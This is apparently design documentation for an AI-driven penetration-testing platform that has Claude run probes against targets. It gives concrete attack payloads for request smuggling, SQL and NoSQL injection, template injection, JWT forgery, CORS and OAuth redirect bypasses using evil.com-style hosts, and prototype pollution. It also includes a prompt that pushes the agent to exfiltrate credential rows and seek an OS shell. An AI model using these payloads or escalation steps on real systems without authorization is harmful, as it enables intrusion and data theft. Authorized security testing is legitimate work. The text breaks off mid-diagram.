**What it is:** HTTP/1.1 specifies two ways to indicate request body length: `Content-Length` (byte count) and `Transfer-Encoding: chunked`. When a front-end proxy and back-end server disagree about which takes precedence, the boundary between HTTP requests shifts — an attacker can prepend data to the next user's request.

**CL.TE attack:**
```
Attacker sends to front-end (trusts Content-Length: 4):
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

12
GENESIS-CL-TE-TEST
0

Front-end sees: 4 bytes → forwards "12\r\n" as body
Back-end sees: chunked → reads "12\r\n" as chunk header (18 bytes), reads body, then "0\r\n\r\n"
Back-end has leftover data that prepends to the next request
```

**Impact:** Request hijacking (steal another user's request including session tokens), cache poisoning, WAF bypass, reflected XSS via request prefix injection.

**CVSS range:** 8.0–9.8 (High to Critical)

---

## 11. Novel Vulnerability Detection Systems

These four tools implement detection capabilities that cannot be scripted because they require contextual judgment about when, where, and how to apply them.

### 11.1 OOB (Out-of-Band) Callback Detection

**The problem it solves:** Many injection vulnerabilities are "blind" — the server processes the injected payload but does not reflect any output back to the attacker. A blind SQL injection returns no error message. A blind SSRF makes a request to an internal service but shows the attacker only "200 OK." Traditional scanners give up here. GENESIS does not.

**How it works (step by step):**

```
Step 1: GENESIS calls oob_check(action=generate, description="testing /api/import URL param for SSRF")

Backend creates a unique token: "a3f9c2d1"
Creates a callback URL: "http://genesis-backend:8000/api/v1/callback/hit/a3f9c2d1"
Stores the token in Redis with a 1-hour TTL
Returns: { token: "a3f9c2d1", callback_url: "http://genesis-backend:8000/api/v1/callback/hit/a3f9c2d1" }

Step 2: GENESIS crafts an SSRF payload using the callback URL
curl_probe → POST /api/import { "url": "http://genesis-backend:8000/api/v1/callback/hit/a3f9c2d1" }

Step 3: If the target server makes an HTTP request to the callback URL, it hits:
GET /api/v1/callback/hit/a3f9c2d1
The backend records: { token: "a3f9c2d1", source_ip: "10.10.0.11", timestamp: ..., method: "GET" }

Step 4: GENESIS calls oob_check(action=check, token="a3f9c2d1")
Returns: { triggered: true, hits: [{source_ip: "10.10.0.11", ...}] }

Result: BLIND SSRF CONFIRMED — the server at 10.10.0.11 made an outbound HTTP request
        to our callback URL when we injected it into the /api/import URL parameter.
```

**Vulnerability classes detected:**
- Blind SSRF (server-side request forgery)
- Blind XXE (via DNS or HTTP entity resolution)
- Blind command injection (if the command includes `curl` or `wget`)
- Log4Shell (the JNDI lookup triggers a DNS/HTTP callback)
- Open redirect to external domains

**Implementation detail:** The callback endpoint (`/api/v1/callback/hit/{token}`) is the only unauthenticated endpoint in GENESIS. Remote servers triggering SSRF callbacks cannot send the API key. All other endpoints require X-API-Key authentication.

---

### 11.2 Differential Probe — Behavioral Comparison Matrix

**The problem it solves:** Some injection vulnerabilities produce no error and return the same HTTP status code regardless of the payload. The difference is subtle — a few bytes in content length, a 50ms timing difference, or a specific word appearing or disappearing. No single request reveals the vulnerability. Only by comparing many requests does the pattern emerge.

**How it works:**

```
Request configuration:
  URL: http://target.com/api/search?q=PARAM
  Test values: ["valid", "1 AND 1=1", "1 AND 1=0", "1' --", "1 UNION SELECT NULL--", "'"]

GENESIS sends all 6 requests and records:
┌─────────────────────┬────────┬────────┬───────────┬─────────────────┐
│ Value               │ Status │ Length │ Time (ms) │ Body preview    │
├─────────────────────┼────────┼────────┼───────────┼─────────────────┤
│ "valid"             │ 200    │ 1842   │ 45        │ {"results":[... │
│ "1 AND 1=1"         │ 200    │ 1842   │ 47        │ {"results":[... │
│ "1 AND 1=0"         │ 200    │ 23     │ 44        │ {"results":[]   │
│ "1' --"             │ 200    │ 1842   │ 46        │ {"results":[... │
│ "1 UNION SELECT"    │ 500    │ 0      │ 52        │ (empty)         │
│ "'"                 │ 200    │ 23     │ 45        │ {"results":[]   │
└─────────────────────┴────────┴────────┴───────────┴─────────────────┘

Analysis:
- "1 AND 1=1" returns 1842 bytes (same as "valid" — SQL TRUE returned results)
- "1 AND 1=0" returns 23 bytes (no results — SQL FALSE returned empty)
- "1 UNION SELECT" returns 500 (SQL error — confirms SQL interpretation)

OBSERVATION: BOOLEAN-BASED BLIND SQL INJECTION CONFIRMED
  "1 AND 1=1" → full results (condition true)
  "1 AND 1=0" → empty results (condition false)
  The application evaluates the SQL expressions in user input.
```

**What it detects:**
- Boolean-based blind SQL injection
- Authentication inconsistencies (some tokens work, some don't — IDOR pattern)
- Business logic: does `?quantity=-1` succeed? Does `?price=0.001` succeed?
- Access control: does changing a user ID in the request return different data?
- Timing side channels: does a specific input cause measurable server delay?

---

### 11.3 Race Condition Probe

**The problem it solves:** Race conditions require sending many requests simultaneously — within the same millisecond. This is impossible with standard sequential tools. The vulnerability window can be as short as a single CPU instruction.

**How it works:**

```javascript
// All requests fire simultaneously via Promise.all
const results = await Promise.all(
  Array.from({ length: 20 }, (_, i) => sendRequest(i))
);

// Each request:
// POST /api/coupon/redeem  { "code": "SAVE50" }
// Headers: { "Authorization": "Bearer user123_token" }

// Expected behavior: first request succeeds (200), rest fail (400 - already used)
// Race condition: multiple requests succeed (200) - coupon applied multiple times
```

**Behavioral analysis:**
```
Normal (atomic): 1 success, 19 failures (400 already_used)
Race condition:   8 successes, 12 failures
                  ↑ Coupon was redeemed 8 times
```

**What it detects:**
- Double-spend in payment systems
- Coupon/voucher redemption multiple times
- Vote manipulation (cast 10 votes simultaneously)
- Account creation race (create two accounts with same email)
- Inventory depletion beyond available stock
- Privilege duplication (e.g. simultaneous admin grant)

**Why it requires AI judgment:** You only want to run race_probe on state-changing endpoints. Running it on a `GET /users` endpoint is wasteful and noisy. GENESIS's Claude model decides to use race_probe specifically when it identifies an endpoint that changes shared state — balance, coupon redemption, etc.

---

### 11.4 Session Working Memory — Cross-Endpoint Correlation

**The problem it solves:** Vulnerabilities that span multiple endpoints cannot be detected by any single tool scan. A tool that tests `/api/users` does not know what it found in `/api/admin`. GENESIS needs to connect findings across 50+ iterations and many different tool calls.

**How it works:**

```
Iteration 3: Claude discovers /api/users returns user objects with sequential integer IDs
  → session_memory(action=store, category=endpoints, key="/api/users", 
                   value='{"returns":"user_objects","id_type":"sequential_int","requires_auth":"yes"}')

Iteration 8: Claude discovers /api/posts returns posts with author_id field
  → session_memory(action=store, category=endpoints, key="/api/posts",
                   value='{"returns":"post_objects","has_author_id":"yes"}')

Iteration 12: Claude gets a session token for user ID 1042
  → session_memory(action=store, category=credentials, key="user_1042_token",
                   value="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")

Iteration 15: Before testing IDOR:
  → session_memory(action=query, category=endpoints)
  → Retrieves: /api/users (sequential int IDs), /api/posts (author_id)
  → Claude reasons: "I have user 1042's token. I should test /api/users/1041 and /api/users/1043.
                    Also, /api/posts uses author_id — I should test accessing other users' posts."

Iteration 16: Tests /api/users/1041 with user 1042's token → returns user 1041's data
  → IDOR CONFIRMED: No ownership check on /api/users/{id}
  → Also tests /api/posts?author_id=1041 → returns user 1041's private posts
  → Second IDOR confirmed — different endpoint, same underlying flaw
  → attack_chain_id: "chain-2", positions 1 and 2
```

**Categories stored:**
- `endpoints` — discovered URLs with behavioral notes
- `params` — interesting parameters found
- `credentials` — tokens, usernames, passwords discovered
- `users` — user IDs, roles, relationships
- `paths` — discovered file paths
- `headers` — interesting response headers
- `cookies` — session cookies and their properties
- `notes` — freeform notes and hypotheses

**Storage backend:** Redis with 24-hour TTL per session. Fast reads (sub-millisecond), no database contention.

---

### 11.5 IDOR Probe — Two-Token Cross-Validation

**The detection problem:** IDOR cannot be detected by sending a single request. You need to know: (1) what data the *authorized* user sees, (2) what an *unauthorized* user sees, and (3) that the responses are meaningfully different. Traditional scanners send a single unauthenticated request and check for a 401/403 — but many APIs return 200 with empty data rather than an access error.

**Two-phase algorithm:**

```
Phase 1 — Own-token sweep:
  For each ID in [start_id .. start_id+range]:
    GET /api/users/{id}  with  Authorization: Bearer own_token
    Record: { status, response_length, excerpt }

Phase 2 — Cross-token validation (for IDs where own_token got 200 + length > 100):
  GET /api/users/{id}  with  Authorization: Bearer other_token
  
  If own_token=200 AND other_token=403/404 → app enforces auth correctly
  If own_token=200 AND other_token=200 with different data → IDOR CONFIRMED
  If 3+ sequential IDs all return 200 → sequential_exposure (data enumerable without other_token)
```

**What makes this novel:** The two-token comparison reveals the gap between "the server returns data" and "the server checks if you're allowed." Standard scanners cannot make this distinction. GENESIS populates `own_token` and `other_token` from credentials stored in `session_memory` under the `credentials` category.

---

### 11.6 CORS Probe — Origin Header Injection Matrix

**The detection problem:** A browser's same-origin policy blocks JavaScript at `evil.com` from reading responses from `bank.com`. The browser only relaxes this restriction based on CORS headers from the server. Testers must probe what origins the server accepts — not just the documented ones.

**Eight-origin probe matrix:**

```
1. null                           → Exploitable via data: URI iframe
2. https://attacker.com           → Wildcard or permissive check
3. https://evil.<target-domain>   → Prefix match bug (trusts anything ending in target domain)
4. https://<host>.evil.com        → Suffix match bug  
5. http://<target-host>           → Scheme downgrade (HTTPS → HTTP)
6. https://evil.<target-host>     → Subdomain poisoning
7. https://not<target-host>       → Does not start with "not"?
8. ""  (empty string)             → Implementation edge case
```

**Severity classification:**
```
Critical: ACAO reflects origin AND ACAC: true
  → Credentialed cross-origin reads — complete authentication bypass for browser-based apps
High: ACAO reflects origin, ACAC absent/false
  → Non-credentialed reads — can still access sensitive unauthenticated endpoints
High: ACAO: null AND ACAC: true
  → Exploitable via data: URI (offline page or email client)
Info: ACAO: * (wildcard)
  → Only exploitable for non-credentialed requests; widely documented and low friction to fix
```

---

### 11.7 JWT Probe — Multi-Attack Token Forgery Suite

**The detection problem:** JWT vulnerabilities are not detectable by header analysis alone. A JWT might look correctly signed but be accepted with `alg:none`. The secret might be in use but easily guessable. The only way to know is to forge tokens and test acceptance.

**Attack sequence:**

```
1. Parse JWT:
   header  = base64url_decode(token.split('.')[0])  → {"alg":"RS256","typ":"JWT"}
   payload = base64url_decode(token.split('.')[1])  → {"sub":"user123","role":"user"}

2. alg:none (4 case variants — some libraries only block lowercase "none"):
   forge header = {"alg":"none","typ":"JWT"}
   forge header = {"alg":"None","typ":"JWT"}
   forge header = {"alg":"NONE","typ":"JWT"}
   forge header = {"alg":"nOnE","typ":"JWT"}
   token = b64(header) + "." + original_payload_b64 + "."  (empty signature)
   → Send to target_url; if status matches baseline → alg:none accepted → CRITICAL

3. Blank secret (HMAC only):
   sig = HMAC-SHA256("", header+"."+payload) as base64url
   → Test: does server accept empty-string HMAC?

4. Common secrets (in-memory brute-force — no HTTP until match found):
   candidates = ["secret","password","key","jwt_secret","change_me","your-256-bit-secret",...]
   for each candidate:
     computed_sig = HMAC-SHA256(candidate, header+"."+payload)
     if computed_sig == original_sig:
       forge admin token + send → SECRET DISCOVERED

5. RS256→HS256 confusion (when public_key provided):
   forge header = {"alg":"HS256","typ":"JWT"}
   sig = HMAC-SHA256(publicKeyPEM, header+"."+payload)
   → Test: server may be configured for HS256 acceptance when RS256 is expected

6. kid injection:
   forge header = {"alg":"HS256","kid":"../../dev/null","typ":"JWT"}
   sig = HMAC-SHA256("", header+"."+payload)  (sign with empty string = /dev/null content)
   → Also test SQLi: kid = "x' UNION SELECT 'secret'-- "
```

---

### 11.8 GraphQL Probe — Schema-Aware API Security Testing

**The detection problem:** GraphQL security cannot be tested with blind HTTP requests. The attack surface is defined by the schema — you must enumerate it first, then test the enumerated surface. Traditional scanners fire static payloads at `/graphql` and miss 80% of the attack surface.

**Schema-first testing sequence:**

```
Test 1 — Introspection:
  POST {"query": "{ __schema { queryType { name } types { name kind fields { name } } } }"}
  If __schema in response → introspection enabled
  → Extract all types, queries, mutations, fields
  → Filter mutations for: admin|delete|update|reset|grant|password|user|role

Test 2 — Field suggestion leakage:
  POST {"query": "{ __type(name: \"User\") { fields { name } } }"}
  Also send a typo query → look for "Did you mean" in error
  → Field suggestions reveal schema even when introspection is disabled

Test 3 — Batch rate-limit bypass:
  POST [{"query": "{__typename}"}, {"query": "{__typename}"}, ...] × batch_size
  If response is JSON array → batching enabled → rate limits bypassable

Test 4 — Deep nesting DoS:
  POST {"query": "{users{posts{comments{likes{user{posts{comments{likes{...}}}}}}}}}"}  (20 levels deep)
  If response_time > baseline_time × 5 → no depth limiting → DoS possible

Test 5 — GET-based CSRF:
  GET {url}?query={__typename}
  If 200 + __typename in body → GET queries accepted → CSRF possible (no preflight for GET)

Test 6 — Sensitive mutation enumeration:
  Compile list of all mutations containing: admin|delete|update|reset|grant|password|user
  → Report as findings requiring manual authorization testing
```

---

### 11.9 SSTI Detect — Multi-Engine Template Injection Prober

**The detection problem:** Template injection requires knowing which template engine is in use — which changes based on stack (Jinja2 for Python, Twig for PHP, FreeMarker for Java, ERB for Ruby, SpEL for Spring). Each engine has different syntax. A probe that works for Jinja2 (`{{7*7}}`) fails silently on FreeMarker (`${7*7}`). Testing all at once creates false-positive risk. GENESIS's matrix approach handles all engines simultaneously with false-positive elimination.

**Ten-probe math matrix with false-positive elimination:**

```
Baseline: GET /search?q=test → record response body

Probes (all expect a specific numeric result that baseline should NOT contain):
  Probe 1: q={{7*7}}            → expect "49"   (Jinja2, Twig)
  Probe 2: q={{7*'7'}}          → expect "7777777" (Jinja2) or "49" (Twig) — distinguishes them
  Probe 3: q=${7*7}             → expect "49"   (FreeMarker, SpEL, EL)
  Probe 4: q=#{7*7}             → expect "49"   (Thymeleaf)
  Probe 5: q=<%= 7*7 %>         → expect "49"   (ERB, EJS)
  Probe 6: q=${{7*7}}           → expect "49"   (Tornado)
  Probe 7: q=*{7*7}             → expect "49"   (SpEL in Spring)
  Probe 8: q=@(7*7)             → expect "49"   (Razor / C# MVC)
  Probe 9: q={{7}}{{7}}         → expect "77"   (Handlebars, Mustache)
  Probe 10: q=%{7*7}            → expect "49"   (Groovy GString)

Confirmed if: result appears in probe response AND does not appear in baseline

Engine confirm (for positive probes):
  Jinja2: inject {{''.__class__.__mro__[1].__subclasses__()}} → check for "<class " in response
  SpEL: inject ${T(java.lang.Runtime)} → check for "Runtime" in error message
  → Confirms RCE pathway without executing any system command
```

---

### 11.10 NoSQL Probe — Operator Injection and Boolean Blind Detection

**The detection problem:** NoSQL injection does not produce SQL error messages. MongoDB operator injection often returns a valid 200 response — just with different data. Detecting it requires comparing response bodies between true and false conditions, similar to boolean-based blind SQL injection.

**Dual injection mode (JSON body vs bracket-notation query params):**

```
JSON body (for application/json APIs):
  { "username": { "$ne": "invalid_xyz_31337" } }  → true condition (username not equal to random string)
  { "username": { "$ne": "" } }                   → false condition (username not equal to empty = all passwords)
  { "username": { "$gt": "" } }                   → always true for any non-empty string
  { "username": { "$regex": ".*" } }              → matches everything
  { "username": { "$where": "1==1" } }            → server-side JS execution
  { "username": { "$nin": [] } }                  → not in empty array = always true

Bracket-notation query params (for form-encoded APIs):
  ?username[$ne]=invalid_xyz_31337
  ?username[$gt]=
  ?username[$regex]=.*

Boolean blind analysis:
  true_response_length  = len(response to $ne: "invalid_xyz_31337")
  false_response_length = len(response to $ne: "")
  
  If |true_length - false_length| > 30 bytes → INJECTION CONFIRMED (responses differ by condition)
  
  Also scan response bodies for: "MongoError", "MongoServerError", "BSONTypeError", 
  "CastError", "WriteError" → confirms MongoDB and reveals error type
```

---

### 11.11 Cache Probe — Unkeyed Header Reflection and Cache Deception

**The detection problem:** Cache poisoning requires probing whether headers that are not part of the cache key are reflected in the response. If `X-Forwarded-Host: evil.com` is not cached as part of the URL but is reflected in the response body, it can be poisoned into the cache.

**Six-test cache attack surface:**

```
Test 1 — X-Forwarded-Host reflection:
  GET /?__cb=<random>  with  X-Forwarded-Host: evil.cache-test.com
  Check body, Location header, and Content-Security-Policy for "evil.cache-test.com"
  If reflected → cache poisoning via unkeyed host header

Test 2 — Path override:
  GET /admin  with  X-Original-URL: /admin  (or X-Rewrite-URL)
  GET /       with  X-Original-URL: /admin
  If second returns admin content → WAF/auth bypass via path override header

Test 3 — IP-based access control bypass:
  GET /admin  with  X-Forwarded-For: 127.0.0.1
  GET /admin  with  X-Real-IP: 127.0.0.1
  GET /admin  with  Client-IP: 127.0.0.1
  If 200 → IP-based restriction bypassable via unvalidated header

Test 4 — Cache deception (static extension trick):
  GET /account/statement.css  (where /account/statement returns sensitive authenticated data)
  If status=200 AND Cache-Control contains "public" or max-age>0 → sensitive page cacheable

Test 5 — Fat GET body poisoning:
  GET / with Content-Length and body
  If body presence changes response → fat GET accepted (some caches ignore body in cache key)

Test 6 — Cache activity detection:
  GET /?__cb=<random1> → record baseline
  GET /?__cb=<random1> → same URL, second request
  If Age header > 0 OR X-Cache: HIT → caching active on this endpoint
```

---

### 11.12 Prototype Pollution Probe — Canary-Based State Mutation Detection

**The detection problem:** Prototype pollution is a server-side vulnerability. The attacker's HTTP response will not reflect the pollution — the effect shows up on other requests to the same process. Standard scanners check only the immediate response for reflection, missing the actual attack vector entirely.

**Canary-based cross-request detection:**

```
Sentinel: "GENESIS_PROBE_TRUE"

Payload 1: { "__proto__": { "polluted": "GENESIS_PROBE_TRUE" } }
Payload 2: { "constructor": { "prototype": { "polluted": "GENESIS_PROBE_TRUE" } } }
Payload 3: { "a": { "__proto__": { "polluted": "GENESIS_PROBE_TRUE" } } }
Payload 4: { "__proto__": { "admin": true } }
Payload 5: { "__proto__": { "isAdmin": true } }
Payload 6: { "__proto__": { "role": "admin" } }

Query payloads (GET params):
  ?__proto__[polluted]=GENESIS_PROBE_TRUE
  ?constructor[prototype][polluted]=GENESIS_PROBE_TRUE
  ?__proto__[admin]=true
  ?__proto__[isAdmin]=true

For each payload sent:
  1. Send pollution request
  2. Immediately send clean baseline request (no pollution keys)
  3. Compare clean response to pre-pollution baseline
  
  If clean status != baseline status → server state mutated → POLLUTION CONFIRMED
  If clean body length differs by > 50 bytes → server state mutated → POLLUTION CONFIRMED
  If 500 on pollution payload → crash vulnerability (denial of service via pollution)
  If sentinel appears in pollution response → direct reflection (simpler variant)
```

---

### 11.13 OAuth Probe — Authorization Flow Security Testing

**The detection problem:** OAuth security requires following redirect chains manually. `redirect: 'follow'` (default in fetch) would silently follow all redirects and lose the intermediate `Location` header that reveals the bypass. GENESIS must use `redirect: 'manual'` and inspect each 302.

**Manual redirect flow testing:**

```
Legitimate flow verification:
  GET {authorize_url}?client_id={cid}&redirect_uri={redir}&response_type=code&state={state}
  → Expect 302 with Location pointing to {redir}?code=...

redirect_uri bypass variants (8 probes):
  1. {redir}/..                    path traversal
  2. {redir}?x=1                   query parameter smuggling  
  3. {redir}#@evil.com             fragment-based bypass
  4. {redir}%23@evil.com           encoded fragment
  5. evil.{registrable-domain}     subdomain of target's domain
  6. {redir}.evil.com              suffix match confusion
  7. //evil.com                    protocol-relative URL
  8. http://evil.com               scheme change from https

For each probe:
  Send authorization request with modified redirect_uri
  Check Location header in 302 response
  locationPointsToEvil = Location.hostname contains "evil.com" or "attacker.com"
  If locationPointsToEvil → redirect_uri bypass confirmed → CRITICAL (authorization code theft)

State parameter test:
  Send authorization request without &state= parameter
  If server returns 302 → CSRF possible (server doesn't require state)

PKCE downgrade test:
  Step 1: Verify PKCE works (send with code_challenge → 302 redirect)
  Step 2: Send without code_challenge
  If 302 returned → PKCE not enforced → authorization code interceptable
```

---

### 11.14 HTTP Smuggling Probe — Raw TCP Socket Desync Testing

**The detection problem:** HTTP request smuggling cannot be tested with `fetch()`, `http.request()`, or curl. These HTTP clients normalize headers before sending — they resolve the CL/TE conflict rather than transmitting the ambiguity. Only raw TCP sockets allow sending genuinely contradictory headers.

**Raw socket implementation and test variants:**

```javascript
// Node.js raw socket wrapper (simplified)
function rawRequest(host, port, tls, rawData, timeout_ms) {
  return new Promise((resolve) => {
    const sock = tls ? tls.connect({host,port}) : net.createConnection({host,port});
    const start = Date.now();
    sock.write(rawData);
    sock.on('data', (chunk) => { responseBuffer += chunk; });
    sock.on('close', () => resolve({ elapsed: Date.now()-start, response: responseBuffer, ... }));
    sock.setTimeout(timeout_ms, () => resolve({ elapsed: timeout_ms, timed_out: true, ... }));
  });
}

CL.TE test (front-end trusts Content-Length, back-end trusts Transfer-Encoding):
  Request = "POST / HTTP/1.1\r\n" +
            "Host: {host}\r\n" +
            "Content-Length: 4\r\n" +
            "Transfer-Encoding: chunked\r\n\r\n" +
            "12\r\nGENESIS-CL-TE-TEST\r\n0\r\n\r\n"
  Detection: front-end sees CL:4 → forwards "12\r\n"; back-end waits for full chunked body
  → Back-end hangs → timing > baseline × 4 → desync confirmed

TE.CL test (front-end trusts Transfer-Encoding, back-end trusts Content-Length):
  Request = "POST / HTTP/1.1\r\n" +
            "Host: {host}\r\n" +
            "Transfer-Encoding: xchunked\r\n" +  ← obfuscated (xchunked)
            "Content-Length: 7\r\n\r\n" +
            "0\r\n\r\nX"                          ← back-end reads 7 bytes = "0\r\n\r\nX"
  Detection: timing differential or connection reset

TE.TE test (two Transfer-Encoding headers):
  Request = "POST / HTTP/1.1\r\n" +
            "Transfer-Encoding: chunked\r\n" +
            "Transfer-Encoding: identity\r\n" +  ← duplicate header
            ...
  Detection: unexpected status or response differs from baseline

Severity classification:
  timing > 4000ms AND timed_out → desync_likely (high severity)
  connection_reset or status=400 → hardened (server rejects malformed CL+TE)
  All clean → not_vulnerable
```

---

## 12. Hypothesis Journal & Adversarial Critic

### 12.1 The Hypothesis Journal

**Why structured hypotheses?** Without an explicit hypothesis journal, an AI agent operates like a drunk man walking — taking actions that seem locally reasonable but have no global strategy. The hypothesis journal forces Claude to:

1. Explicitly state what it believes before testing
2. Track the evidence for and against each belief
3. Update beliefs when evidence contradicts them
4. Know when a hypothesis is ruled out (stop wasting iterations on it)

**Hypothesis lifecycle:**

```
State: active
"I believe the login form is vulnerable to SQL injection.
Evidence for: input is reflected in the error message (possible error-based injection)
Evidence against: none yet
Next test: try single quote injection"

[Claude runs sqlmap]
[sqlmap returns: 'error: no injection found']

State: active (updated)
"Hypothesis h2: login form may use parameterized queries but the password reset form may not
Evidence for: login form resistant to sqlmap, but password reset uses different code path
Evidence against: none yet  
Next test: test password reset email field"

[Claude runs differential_probe on password reset]
[differential_probe detects status split between 'valid@email.com' and "' OR '1'='1'@email.com"]

State: confirmed
"Boolean-based injection confirmed in password reset endpoint.
Evidence for: 'OR 1=1' causes different response than normal email"
```

**Updated Hypothesis format (v2.0):**

```json
{
  "HYPOTHESIS": {
    "id": "h1",
    "statement": "The /api/users endpoint is vulnerable to IDOR — integer IDs are sequential and no ownership check is enforced.",
    "confidence": 0.75,
    "evidence_for": [
      "httpx_probe returned /api/users/1042 with full user object",
      "nmap found no WAF, so no blanket rate limiting"
    ],
    "evidence_against": [],
    "next_test": "Run idor_probe on /api/users/{id} with own_token=stored JWT and range=20",
    "falsification_criteria": "All IDs 1041–1061 return 403/404, or cross-token check shows same content for attacker and victim tokens",
    "attack_chain_id": "chain-1",
    "status": "active"
  }
}
```

The `falsification_criteria` field (new in v2.0) forces Claude to pre-define what evidence would definitively rule out the hypothesis before any testing begins. This prevents confirmation bias — Claude cannot declare a hypothesis "active" without knowing the conditions under which it would close the hypothesis as `ruled_out`.

The `attack_chain_id` field links the hypothesis to a broader attack chain being tracked. Multiple hypotheses sharing the same `attack_chain_id` are components of one multi-step attack path.

**How it is stored:** MongoDB `hypothesis_journals` collection, indexed by `(session_id, hyp_id)`. Upserted on each update (same hypothesis ID → update existing document). The `falsification_criteria` and `attack_chain_id` fields are persisted as string columns in the same document.

**How it is displayed:** The Hypotheses tab in Session Viewer shows each hypothesis with:
- Status chip (active=orange, confirmed=green, ruled_out=red)
- Confidence bar (0–100%)
- Evidence for (green bullet points)
- Evidence against (red bullet points)
- Next planned test (blue italic text)

### 12.2 The Adversarial Critic (Always-On, Tier-1)

**The false positive problem:** Claude's primary agent is motivated to find vulnerabilities (that is its goal). This creates a bias toward reporting borderline cases as real findings. An 85% confident finding might actually be a false positive caused by server caching, load balancing, or a benign behavioral difference.

**The solution:** A second, independent AI call that plays devil's advocate — now running on **every** confirmed/exploited finding (not just unverified ones), and now seeing the **cited evidence**.

**How it works:**

```python
# Runs on:
#   - any finding claimed `confirmed` or `exploited`  (can downgrade to 'disputed')
#   - any `unverified` finding with confidence >= 0.6 (can promote to 'confirmed')

critic_prompt = """
You are a rigorous security review critic. Decide whether the cited
evidence is sufficient to confirm this vulnerability as a real finding.
Apply these rules strictly:
  (1) No evidence cited                            -> 'disputed'
  (2) Evidence vague / paraphrased / no observable -> 'disputed'
  (3) Specific tool output, response diff, OOB hit,
      or exact code line cited                     -> 'confirmed'
Reply with ONLY a JSON object:
{"verdict": "confirmed" | "disputed", "reason": "..."}
"""

critic_input = f"""
Title:         {title}
Description:   {description[:400]}
Confidence:    {confidence:.2f}
Claimed status: {starting_status}
Evidence cited:
{bullet_list(evidence_for[:5])}
"""

# Model: Claude Haiku 4.5 (fast, cheap — not the same model as the assessor)
# Max tokens: 200 (short, decisive response)
```

**Why Haiku as the critic?** Using Haiku (not Sonnet/Opus) for the critic serves two purposes:
1. Cost efficiency — critic calls now run on every claimed-confirmed finding, so a cheaper model matters
2. Independence — Haiku's different training means it is not simply agreeing with the primary's reasoning style

**What the critic now sees:** Unlike in the pre-Tier-1 design, the critic now receives the `evidence_for` list. This means it can reject a finding whose evidence is generic ("the response looked suspicious") and approve one whose evidence is specific ("response length went 412→48 on payload X"). The critic still cannot see the full conversation or tool outputs — it judges only what was *cited* as proof.

**Outcome mapping (Tier-1):**

| Critic verdict | Primary's verification_status | Final status | Meaning |
|---|---|---|---|
| confirmed | unverified | confirmed | Critic promotes a strong-evidence unverified finding |
| confirmed | confirmed | confirmed | Both agents agree — high confidence |
| confirmed | exploited | exploited | Kept — critic confirmed evidence matches exploitation claim |
| disputed | confirmed | disputed | Critic rejects the claim despite primary confidence |
| disputed | exploited | disputed | Critic rejects the exploitation claim |
| disputed | unverified | disputed | Critic rejects a high-confidence unverified finding |
| (skipped) | unverified (conf<0.6) | unverified | Not confident enough to bother the critic |

**Frontend display:** `disputed` findings show an orange "DISPUTED" chip on the vulnerability card. They are included in the count but visually flagged for human review. The `verification_output` text column captures the full audit trail — cited evidence, claimed status, final status, and the reason for any downgrade.

### 12.3 Evidence Enforcement (Tier-1)

Before the critic runs, the platform applies two hard rules to the claimed `verification_status`:

1. **`confirmed` or `exploited` without `evidence_for` is invalid.** The save path rewrites the status to `unverified` and records `"no evidence_for cited"` in `verification_output`. The critic still runs afterwards, but it now sees an `unverified` claim.
2. **Blind-class vulnerabilities require a confirmed OOB hit.** If the title or description contains `blind`, `oob`, `out-of-band`, `time-based`, or `dns-exfil`, the platform scans each `evidence_for` entry for 32-character hex token substrings and looks them up in Redis under `genesis:oob:{token}`. If *none* of those tokens has a recorded hit, the status is downgraded to `unverified` with reason `"blind-class vuln without confirmed OOB callback hit"`. This closes the most common class of fabricated confirmation — a model claiming a blind SSRF without ever having received a callback.

These rules are enforced in `ai_orchestrator._save_vulnerability()`. There is no way for the model to bypass them by clever wording — the check is structural (field present? token in Redis?).

### 12.4 Wedged-Loop Guard (Tier-1)

A long autonomous loop can get stuck calling the same tool with the same parameters, usually when a scanner returns empty and the model does not recognise that running it again won't help. The platform now detects this structurally.

**Mechanism:** A 5-entry ring buffer of `(tool_name, sha1(params)[:12])` tuples, updated on every `tool_use` block Claude emits. If the last three entries are identical:

1. A `[LOOP_GUARD]` text block is appended to the *next* user message (alongside the pending tool_result blocks, so tool_use_id pairing is preserved):

   ```
   [LOOP_GUARD] You have invoked `nuclei_scan` with identical parameters
   3 times in a row. The input is not yielding new information. Summarize
   what you know, then pivot to a different tool or a different parameter
   set, or emit your FINAL_REPORT block.
   ```

2. A `loop_break` WebSocket event is published for operator visibility (`{tool, iteration, count}`).
3. The ring buffer is cleared so the same signature doesn't re-trigger immediately.
4. If the wedge-count reaches 2 within a session, a stronger `[LOOP_GUARD]` message is appended telling the model to emit `FINAL_REPORT` now.

This prevents a single sticky tool from consuming the rest of the iteration budget, and gives operators a visible signal when automation is degenerating.

### 12.5 Active Chain Suggestion (Tier-1)

Pre-Tier-1, GENESIS recorded attack chains *after the fact* — the `AttackChainService` post-correlates findings by shared `attack_chain_id`, port/service proximity, and vector similarity once the session is over. Nothing in the live loop ever told the model "you just confirmed X, now try Y."

Tier-1 adds that driver. When `_save_vulnerability()` lands a finding at `confirmed` or `exploited` and the title/description matches an entry in the chain-suggestion table, a `[CHAIN_NUDGE]` text block is queued for the next user turn:

```
[CHAIN_NUDGE after confirmed finding 'SQL Injection in /api/users'
(chain_id=chain-1, chain_position=2)]
Next steps for SQL injection:
 (1) dump database/schema names and table list,
 (2) locate the users or credentials table and exfiltrate rows,
 (3) attempt sqlmap --os-shell or UDF if the DB user is privileged,
 (4) re-read tainted fields elsewhere in the app for second-order SQLi.
Keep the same attack_chain_id on any follow-up VULNERABILITY block.
```

The suggestion table lives in `ai_orchestrator._CHAIN_SUGGESTIONS` and covers the common exploitation follow-ups: SQLi, SSRF, file upload, IDOR, JWT, GraphQL introspection, CORS, XXE, RCE, command injection, prototype pollution, SSTI, open redirect, OAuth, auth bypass. First substring match wins; the orchestrator also emits a `chain_suggestion` WebSocket event for the UI.

**Why text-only, not a tool call?** The nudge is just a user-turn hint — it does not pre-select a specific tool. Claude decides how to execute. This keeps the model in control of tactics while the platform nudges strategy.

**Delivery timing.** Nudges are held in `pending_chain_nudges` until the next user turn. If the current response contained `tool_use` blocks, the nudge rides alongside the tool_result blocks (as a trailing text block — tool_result must come first). If the response ended with `end_turn`, the nudge is concatenated into the standard "continue your assessment" prompt. Either way, Claude sees it before its next decision.

---

## 13. Multi-Agent Mode — Parallel Intelligence

### 13.1 Architecture

In multi-agent mode, GENESIS spawns four specialized agents running simultaneously, each with a focused tool subset:

```
┌─────────────────────────────────────────────────────────────┐
│                   STRATEGIST AGENT                          │
│   Receives reports from all 4 agents                        │
